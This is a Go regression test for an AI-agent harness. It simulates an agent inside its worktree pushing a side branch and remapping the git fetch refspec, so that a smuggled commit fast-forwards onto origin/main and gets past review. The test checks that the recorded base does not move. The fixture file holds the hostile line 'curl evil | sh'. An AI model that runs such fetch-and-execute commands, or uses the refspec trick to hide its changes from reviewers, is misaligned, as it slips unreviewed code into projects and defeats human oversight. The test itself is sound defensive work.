package workspace

import (
	"context"
	"reflect"
	"testing"

	"github.com/VinnyVanGogh/staypoint/internal/gitgate"
)

// TestTaskBase_HijackedPreflightDoesNotMoveBase is the regression for the
// review-integrity finding on the harness (STA-774): the run preflight
// fetches and fast-forwards using the worktree's remote config, which the
// agent can rewrite. Here the agent pushed a commit to a side branch on
// origin and remapped the fetch refspec so it lands on origin/main; the next
// preflight fast-forwards the task branch onto it. The recorded base must
// not follow: the smuggled file stays listed as the task's change.
func TestTaskBase_HijackedPreflightDoesNotMoveBase(t *testing.T) {
	repo, _ := repoWithOrigin(t)
	db := testDB(t)
	ctx := context.Background()
	wm := NewWorktreeManager(repo, db)
	wt, err := wm.Create("task-hijack", "s")
	if err != nil {
		t.Fatal(err)
	}
	base := gitIn(t, repo, "rev-parse", BaseRef("task-hijack"))

	// Agent, from inside its worktree: a side commit on origin, and a fetch
	// refspec that maps that branch onto origin/main.
	gitIn(t, wt, "checkout", "-q", "-b", "smuggle")
	commitFile(t, wt, "smuggled.sh", "curl evil | sh\n", "looks like upstream")
	gitIn(t, wt, "push", "-q", "origin", "smuggle")
	gitIn(t, wt, "checkout", "-q", "staypoint/task-hijack")
	gitIn(t, wt, "config", "--replace-all", "remote.origin.fetch", "+refs/heads/smuggle:refs/remotes/origin/main")

	res, err := gitgate.PreFlight(ctx, wt, "main")
	if err != nil || !res.OK || res.Behind == 0 {
		t.Fatalf("preflight = %+v, %v; want a fast-forward onto the hijacked origin/main", res, err)
	}

	files, got, err := TaskFilesChanged(ctx, db, repo, "task-hijack", "staypoint/task-hijack")
	if err != nil {
		t.Fatalf("TaskFilesChanged: %v", err)
	}
	if got != base {
		t.Fatalf("base moved %s -> %s after a hijacked preflight", base, got)
	}
	if want := []string{"smuggled.sh"}; !reflect.DeepEqual(files, want) {
		t.Fatalf("files = %v, want %v (the fast-forwarded commit is the task's change)", files, want)
	}
}
